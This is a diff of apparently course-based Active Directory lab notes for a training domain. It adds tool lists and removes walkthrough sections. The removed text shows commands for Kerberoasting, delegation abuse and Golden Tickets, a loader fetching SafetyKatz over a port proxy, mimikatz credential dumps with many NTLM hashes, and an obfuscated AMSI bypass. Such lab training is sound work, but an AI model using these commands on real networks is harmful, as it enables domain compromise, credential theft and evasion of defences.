@@ -8,6 +8,15 @@
 
 - Using the Kerberoasting attack, get the clear-text password for an account in `us.techcorp.local` domain
 
+#### Tools
+
+- `InviShell`
+- `ADModule` (alternative: `PowerView`)
+- `ArgSplit`
+- `NetLoader`
+- `Rubeus` (alternative: `KerberosRequestorSecurityToken` + `Invoke-Mimi`)
+- `john` (alternative: `tgsrepcrack`)
+
 #### Solution
 
 - Using the Kerberoasting attack, get the clear-text password for an account in `us.techcorp.local` domain
@@ -28,7 +37,7 @@ Name                 : serviceaccount
 ObjectClass          : user
 ObjectGUID           : 8a97f972-51b1-4647-8b73-628f5da8ca01
 SamAccountName       : serviceaccount 👤
-ServicePrincipalName : {USSvc/serviceaccount}
+ServicePrincipalName : {USSvc/serviceaccount} 📌
 SID                  : S-1-5-21-210670787-2521448726-163245708-1144
 Surname              : account
 UserPrincipalName    : serviceaccount
@@ -40,7 +49,7 @@ Name                 : appsvc
 ObjectClass          : user
 ObjectGUID           : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c
 SamAccountName       : appsvc 👤
-ServicePrincipalName : {appsvc/us-jump.us.techcorp.local}
+ServicePrincipalName : {appsvc/us-jump.us.techcorp.local} 📌
 SID                  : S-1-5-21-210670787-2521448726-163245708-4601
 Surname              : svc
 UserPrincipalName    : appsvc
@@ -52,7 +61,7 @@ serviceaccount
 appsvc
 ```
 
-**Note**: it is not necessary to have an actual service using `serviceaccount`.
+⚠️ **Note**: it is not necessary to have an actual service using `serviceaccount`.
 
 For the DC, an account with SPN set is a service account.
 
@@ -196,6 +205,15 @@ All tickets cracked!
 - Determine if `studentuser51` has permissions to set UserAccountControl flags for any user
 - If yes, force set a SPN on the user and obtain a TGS for the user
 
+#### Tools
+
+- `InviShell`
+- `ADModule` (alternative: `PowerView`)
+- `ArgSplit`
+- `NetLoader`
+- `Rubeus` (alternative: `KerberosRequestorSecurityToken` + `Invoke-Mimi`)
+- `john` (alternative: `tgsrepcrack`)
+
 #### Solution
 
 - Determine if `studentuser51` has permissions to set UserAccountControl flags for any user
@@ -326,7 +344,7 @@ Desk@123 🔑        (?)
 ---
 ---
 
-## Unconstrained Delegation Abuse
+## Unconstrained Delegation & Printer Bug Abuse
 
 ### Lab: Hands-On #11
 
@@ -334,6 +352,20 @@ Desk@123 🔑        (?)
 
 - Find a server in `us.techcorp.local` domain where Unconstrained Delegation is enabled
 - Compromise that server and get Domain Admin privileges
+
+#### Tools
+
+- `InviShell`
+- `ADModule` (alternative: `PowerView`)
+- `ArgSplit`
+- `NetLoader`
+- `Rubeus`
+- `Find-PSRemotingLocalAdminAccess`
+- `xcopy`
+- `netsh`
+- `Enter-PSSession`
+- `MS-RPRN`
+- `SafetyKatz` (alternative: `Invoke-Mimi`)
 
 #### Solution
 
@@ -636,6 +668,15 @@ We can run the DCSync attack using Invoke-Mimi or any other tool too.
 
 - Abuse Constrained delegation in `us.techcorp.local` to escalate privileges on a machine to Domain Admin
 
+#### Tools
+
+- `InviShell`
+- `ADModule` (alternative: `PowerView`)
+- `ArgSplit`
+- `NetLoader`
+- `Rubeus`
+- `winrs` (alternative: `Enter-PSSession`)
+
 #### Solution
 
 - Abuse Constrained delegation in `us.techcorp.local` to escalate privileges on a machine to Domain Admin
@@ -658,7 +699,7 @@ ObjectClass              : computer
 ObjectGUID               : 6f7957b5-d229-4d00-8778-831aa4d9afac
 ```
 
-Recall that on a previous hands-on (#10) we extracted credentials of `appsvc` from `us-jump`. Let’s use the AES256 keys for `appsvc` to impersonate the domain administrator `us\Administrator` and access `us-mssql` using those privileges.
+Recall that on a previous hands-on (#10) we extracted credentials of `appsvc` from `us-jump`. Let's use the AES256 keys for `appsvc` to impersonate the domain administrator `us\Administrator` and access `us-mssql` using those privileges.
 
 Note that we request an alternate ticket for HTTP service to be able to use WinRM.
 
@@ -730,13 +771,25 @@ Note that we will have privileges of domain administrator but that is only limit
 
 ## RBCD (Resource-based Constrained Delegation) Abuse
 
-### Lab: Hands-On #13
+### Lab: Hands-On #13.1
 
 #### Tasks
 
 - Find a computer object in `us.techcorp.local` domain where we have Write permissions
 - Abuse the Write permissions to access that computer as Domain Admin
 - Extract secrets from that machine for users and hunt for local admin privileges for the users
+
+#### Tools
+
+- `InviShell`
+- `xcopy`
+- `winrs`
+- `netsh`
+- `ArgSplit`
+- `NetLoader`
+- `SafetyKatz`
+- `PowerView`
+- `Rubeus`
 
 #### Solution
 
@@ -1009,8 +1062,6 @@ COMPUTERNAME=US-HELPDESK 🖥️
 C:\Users\Administrator.US> exit
 ```
 
-- Extract secrets from that machine for users and hunt for local admin privileges for the users
-
 Now, to copy our Loader to `us-helpdesk`, we need to access the filesystem.
 Let's request a TGS for CIFS using Rubeus in the same process as above.
 
@@ -1056,142 +1107,37 @@ Cached Tickets: (2)
 [SNIP]
 ```
 
-Now, copy the NetLoader, add port redirection and run SafetyKatz on `us-helpdesk` to extract credentials from LSASS.
-
-```
-C:\Users\studentuser51> echo F | xcopy C:\AD\Tools\Loader.exe \\us-helpdesk\C$\Users\Public\Loader.exe /Y
-
-[SNIP]
-
-C:\Users\studentuser51> winrs -r:us-helpdesk cmd
-
-Microsoft Windows [Version 10.0.17763.5329]
-(c) 2018 Microsoft Corporation. All rights reserved.
-C:\Users\Administrator.US>
-🚀
-
-C:\Users\Administrator.US> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.51
-```
-
-```
-C:\Users\Administrator.US> echo %Pwn%
-
-sekurlsa::ekeys
-
-C:\Users\Administrator.US> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args %Pwn% "exit"
-
-[SNIP]
-
-mimikatz(commandline) # sekurlsa::ekeys
-
-[SNIP]
-
-Authentication Id : 0 ; 999 (00000000:000003e7)
-Session           : UndefinedLogonType from 0
-User Name         : US-HELPDESK$
-Domain            : US
-Logon Server      : (null)
-Logon Time        : 7/2/2024 2:12:50 AM
-SID               : S-1-5-18
-
-         * Username : us-helpdesk$ 👤
-         * Domain   : US.TECHCORP.LOCAL
-         * Password : (null)
-         * Key List :
-           aes256_hmac       b654a7108a6e384d0e8a57db97dc10afed802f40b419eb7688e821478ccdaf9f 🔑
-           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
-
-[SNIP]
-
-Authentication Id : 0 ; 1517629 (00000000:0017283d)
-Session           : RemoteInteractive from 2
-User Name         : helpdeskadmin
-Domain            : US
-Logon Server      : US-DC
-Logon Time        : 7/2/2024 2:25:32 AM
-SID               : S-1-5-21-210670787-2521448726-163245708-1120
-
-         * Username : helpdeskadmin 👤
-         * Domain   : US.TECHCORP.LOCAL
-         * Password : (null)
-         * Key List :
-           aes256_hmac       f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 🔑
-           rc4_hmac_nt       94b4a7961bb45377f6e7951b0d8630be
-
-[SNIP]
-```
-
-Reuse the AES keys of `helpdeskadmin` and use `Find-PSRemotingLocalAdminAccess` for hunting local admin privileges.
-
-Run the OverPass-the-hash command using Rubeus from an elevated shell.
-
-```
-C:\Windows\System32> echo %Pwn%
-
-asktgt
-
-C:\Windows\System32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-
-[SNIP]
-
-[*] Action: Ask TGT
-
-[SNIP]
-
-[+] Ticket successfully imported!
-
-  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
-  ServiceRealm             :  US.TECHCORP.LOCAL
-  UserName                 :  helpdeskadmin
-  UserRealm                :  US.TECHCORP.LOCAL
-  StartTime                :  4/25/2025 6:02:41 AM
-  EndTime                  :  4/25/2025 4:02:41 PM
-  RenewTill                :  5/2/2025 6:02:41 AM
-  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
-  KeyType                  :  aes256_cts_hmac_sha1
-  Base64(key)              :  OF/qVyRqsw13QYBfSvhanUi1L9rc4Awa3cY6GW54cCw=
-  ASREP (key)              :  F3AC0C70B3FDB36F25C0D5C9CC552FE9F94C39B705C4088A2BB7219AE9FB6534
-```
-
-In the new process.
-
-```
-C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
-
-[SNIP]
-
-PS C:\Windows\system32> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
-
-PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
-
-VERBOSE: Trying to run a command parallely on the provided computers list using PSRemoting.
-US-HelpDesk 🖥️
-US-ADConnect 🖥️
-```
-
-So, `helpdeskadmin` has administrative privileges on `us-adconnect` too.
-
 ---
 ---
 
 ## Golden Ticket Attack
 
-### Lab: Hands-On #14
+### Lab: Hands-On #14.1
 
 #### Tasks
 
-- Using the NTLM hash or AES key of `krbtgt` account of `us.techcorp.local`, create a Golden Ticket.
-- Use the Golden Ticket to (once again) get domain admin privileges from a machine.
+- Using the NTLM hash or AES key of `krbtgt` account of `us.techcorp.local`, create a Golden Ticket
+- Use the Golden Ticket to (once again) get domain admin privileges from a machine
+
+#### Tools
+
+- `InviShell`
+- `ArgSplit`
+- `NetLoader`
+- `Rubeus`
+- `winrs` (alternative: `Enter-PSSession`)
 
 #### Solution
 
+- Using the NTLM hash or AES key of `krbtgt` account of `us.techcorp.local`, create a Golden Ticket
+
 From one of the previous hands-on (#11), we have domain admin privileges (we abused the printer bug on `us-web.us.techcorp.loal` with unconstrained delegation and ran DCSync attack).
 
-Let’s use the AES keys of `krbtgt` account to create a Golden Ticket.
+Let's use the AES keys of `krbtgt` account to create a Golden Ticket.
 
 **Using Rubeus**
 
-Use the below Rubeus command to generate an OPSEC friendly command for Golden Ticket.
+⭐ Use the below Rubeus command to generate an OPSEC friendly command for Golden Ticket.
 Note that 3 LDAP queries are sent to the DC to retrieve the required information.
 
 ```
@@ -1280,322 +1226,6 @@ C:\Users\Administrator>netsh interface portproxy add v4tov4 listenport=8080 list
 C:\Users\Administrator>exit
 ```
 
-Now, to extract all the secrets in the domain from the domain controller, we can use the below command.
-Run the below commands from the command prompt where we injected the Golden Ticket.
-
-```
-C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\us-dc\C$\Users\Public\Loader.exe /Y
-
-Does \\us-dc\C$\Users\Public\Loader.exe specify a file name
-or directory name on the target
-(F = file, D = directory)? F
-C:\AD\Tools\Loader.exe
-1 File(s) copied
-```
-
-```
-C:\Users\studentuser51>C:\AD\Tools\ArgSplit.bat
-[!] Argument Limit: 180 characters
-[+] Enter a string: lsadump::lsa
-
-[SNIP]
-```
-
-Copy the generated commands and use it on the winrs session on `us-dc`.
-
-```
-C:\Windows\system32> winrs -r:us-dc cmd
-
-Microsoft Windows [Version 10.0.17763.5329]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Users\Administrator>
-🚀
-```
-
-```
-C:\Users\Administrator>echo %Pwn%
-
-lsadump::lsa
-
-C:\Users\Administrator>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
-
-[SNIP]
-
-mimikatz(commandline) # lsadump::lsa /patch
-
-Domain : US / S-1-5-21-210670787-2521448726-163245708
-
-[SNIP]
-
-RID  : 000001f4 (500)
-User : Administrator 👤
-LM   :
-NTLM : 43b70d2d979805f419e02882997f8f3f 🔑
-
-RID  : 000001f6 (502)
-User : krbtgt
-LM   :
-NTLM : b0975ae49f441adc6b024ad238935af5
-
-[SNIP]
-
-RID  : 00000458 (1112)
-User : emptest
-LM   :
-NTLM : 216fa4d07d30bdf282443cf7241abb8b
-
-RID  : 0000045a (1114)
-User : adconnect
-LM   :
-NTLM : 4e150424ccf419d83ce3a8ad1db7b94a
-
-RID  : 0000045b (1115)
-User : mgmtadmin
-LM   :
-NTLM : e53153fc2dc8d4c5a5839e46220717e5
-
-RID  : 00000460 (1120)
-User : helpdeskadmin
-LM   :
-NTLM : 94b4a7961bb45377f6e7951b0d8630be
-
-RID  : 00000461 (1121)
-User : dbservice
-LM   :
-NTLM : e060fc2798a6cc9d9ac0a3bb9bf5529b
-
-RID  : 00000462 (1122)
-User : atauser
-LM   :
-NTLM : f7f6ab297d5a4458073b91172f498b70
-
-RID  : 00000464 (1124)
-User : exchangeadmin
-LM   :
-NTLM : 65c1a880fcf8832d55fdc1d8af76f117
-
-[SNIP]
-
-RID  : 00000470 (1136)
-User : exchangemanager
-LM   :
-NTLM : b8a0ea6e3c104472377d082154faa9e4
-
-RID  : 00000471 (1137)
-User : exchangeuser
-LM   :
-NTLM : 1ef08776e2de6e9d9062ff9c81ff3602
-
-RID  : 00000472 (1138)
-User : pawadmin
-LM   :
-NTLM : 36ea28bfa97a992b5e85bd22485e8d52
-
-RID  : 00000473 (1139)
-User : jwilliams
-LM   :
-NTLM : 65c6bbc54888cbe28f05b30402b7c40b
-
-RID  : 00000474 (1140)
-User : webmaster
-LM   :
-NTLM : 23d6458d06b25e463b9666364fb0b29f
-
-RID  : 00000478 (1144)
-User : serviceaccount
-LM   :
-NTLM : 58a478135a93ac3bf058a5ea0e8fdb71
-
-RID  : 000004f7 (1271)
-User : devuser
-LM   :
-NTLM : 539259e25a0361ec4a227dd9894719f6
-
-RID  : 00000507 (1287)
-User : testda
-LM   :
-NTLM : a9cc782709f6bb95aae7aab798eaabe7
-
-RID  : 00000509 (1289)
-User : decda
-LM   :
-NTLM : 068a0a7194f8884732e4f5a7cb47e17c
-
-RID  : 000011f9 (4601)
-User : appsvc
-LM   :
-NTLM : 1d49d390ac01d568f0ee9be82bb74d4c
-
-RID  : 0000219a (8602)
-User : provisioningsvc
-LM   :
-NTLM : 44dea6608c25a85d578d0c2b6f8355c4
-
-[SNIP]
-
-RID  : 000003e8 (1000)
-User : US-DC$
-LM   :
-NTLM : f4492105cb24a843356945e45402073e
-
-RID  : 00000450 (1104)
-User : US-EXCHANGE$
-LM   :
-NTLM : 20a0e5d7c56dc75c9d2b4f3ac6c22543
-
-RID  : 00000451 (1105)
-User : US-MGMT$
-LM   :
-NTLM : fae951131d684b3318f524c535d36fb2
-
-RID  : 00000452 (1106)
-User : US-HELPDESK$
-LM   :
-NTLM : 76c3848cc2e34ef0a8b5751f7e886b8e
-
-RID  : 00000453 (1107)
-User : US-MSSQL$
-LM   :
-NTLM : ccda609713cb52b1aa752ee23aaf2fae
-
-RID  : 00000454 (1108)
-User : US-MAILMGMT$
-LM   :
-NTLM : 6e1c353761fff751539e175a8393a941
-
-RID  : 00000456 (1110)
-User : US-WEB$
-LM   :
-NTLM : 892ca1e8d4343c652646b59b51779929
-
-RID  : 00000457 (1111)
-User : US-ADCONNECT$
-LM   :
-NTLM : 093f64d9208f2b546a3b487388b2b34a
-
-RID  : 00002199 (8601)
-User : jumpone$
-LM   :
-NTLM : 002280692be1ec66d62906c8d0556206
-
-RID  : 00004ac5 (19141)
-User : STUDENT51$
-LM   :
-NTLM : 14a39441fcad13fc52033aeda13e0535
-
-[SNIP]
-
-RID  : 00004c91 (19601)
-User : US-JUMP3$
-LM   :
-NTLM : 17f83967a7a6d0119943da97554035d4
-
-RID  : 0000044f (1103)
-User : TECHCORP$
-LM   :
-NTLM : 3e56c4806d5e7b37737ca9297879cb1f
-
-RID  : 00000477 (1143)
-User : EU$
-LM   :
-NTLM : 391274f8e8affd8f36198b46763dd59e
-```
-
-**Using Invoke-Mimi.ps1 and PowerShell Remoting**
-
-We can also use Invoke-Mimi from a normal PowerShell session.
-
-```
-PS C:\AD\Tools> Import-Module C:\AD\Tools\Invoke-Mimi.ps1
-
-PS C:\AD\Tools> Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
-
-[SNIP]
-
-mimikatz(powershell) # kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt
-
-User      : Administrator
-Domain    : us.techcorp.local (US)
-SID       : S-1-5-21-210670787-2521448726-163245708
-User Id   : 500
-Groups Id : *513 512 520 518 519
-ServiceKey: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 - aes256_hmac
-Lifetime  : 4/25/2025 7:38:16 AM ; 4/25/2025 5:38:16 PM ; 5/2/2025 7:38:16 AM
--> Ticket : ** Pass The Ticket **
-
-[SNIP]
-
-Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session
-```
-
-Access the DC using PowerShell Remoting.
-
-```
-PS C:\AD\Tools> klist
-
-[SNIP]
-
-Cached Tickets: (1)
-
-#0>     Client: Administrator @ us.techcorp.local
-        Server: krbtgt/us.techcorp.local @ us.techcorp.local
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
-        Start Time: 4/25/2025 7:38:16 (local)
-        End Time:   4/25/2025 17:38:16 (local)
-        Renew Time: 5/2/2025 7:38:16 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0x1 -> PRIMARY
-        Kdc Called:
-        
-PS C:\AD\Tools> Enter-PSSession -ComputerName us-dc
-
-[us-dc]: PS C:\Users\Administrator\Documents> whoami
-
-us\administrator 👤
-
-[us-dc]: PS C:\Users\Administrator\Documents> hostname
-
-US-DC 🖥️
-
-[us-dc]: PS C:\Users\Administrator\Documents>exit
-```
-
-We can extract all the secrets from the DC.
-Run the below commands from the PowerShell session where you injected Golden Ticket.
-
-```
-PS C:\AD\Tools> $sess = New-PSSession us-dc.us.techcorp.local
-
-PS C:\AD\Tools> Enter-PSSession -Session $sess
-
-[us-dc.us.techcorp.local]: PS C:\Users\Administrator\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
-
-[us-dc.us.techcorp.local]: PS C:\Users\Administrator\Documents> exit
-
-PS C:\AD\Tools> Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
-
-PS C:\AD\Tools> Enter-PSSession -Session $sess
-
-[us-dc.us.techcorp.local]: PS C:\Users\Administrator\Documents> Invoke-Mimi -Command '"lsadump::lsa /patch"'
-
-[SNIP]
-
-mimikatz(powershell) # lsadump::lsa /patch
-
-Domain : US / S-1-5-21-210670787-2521448726-163245708
-
-[SNIP]
-
-RID  : 000001f4 (500)
-User : Administrator 👤
-LM   :
-NTLM : 43b70d2d979805f419e02882997f8f3f 🔑
-
-[SNIP]
-```
-
 ---
 ---
 
@@ -1607,6 +1237,14 @@ NTLM : 43b70d2d979805f419e02882997f8f3f 🔑
 
 - During the additional lab time, try to get command execution on the domain controller by creating Silver Ticket for HTTP service and WMI service
 
+#### Tools
+
+- `InviShell`
+- `ArgSplit`
+- `NetLoader`
+- `Rubeus`
+- `winrs` (alternative: `Enter-PSSession`)
+
 #### Solution
 
 - During the additional lab time, try to get command execution on the domain controller by creating Silver Ticket for HTTP service and WMI service
@@ -1615,7 +1253,7 @@ From the information gathered in previous steps we have the hash for machine acc
 
 Using the below command from an elevated shell, we can create a Silver Ticket that provides us access to the HTTP service of DC.
 
-Note that you can also use AES256 keys in place of NTLM hash.
+⭐ Note that you can also use AES256 keys in place of NTLM hash.
 
 **HTTP Service**
 
@@ -1660,7 +1298,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-We have the HTTP service ticket for `us-dc`, let’s try accessing it using winrs.
+We have the HTTP service ticket for `us-dc`, let's try accessing it using winrs.
 
 Note that we are using FQDN of `us-dc` as that is what the service ticket has.
 
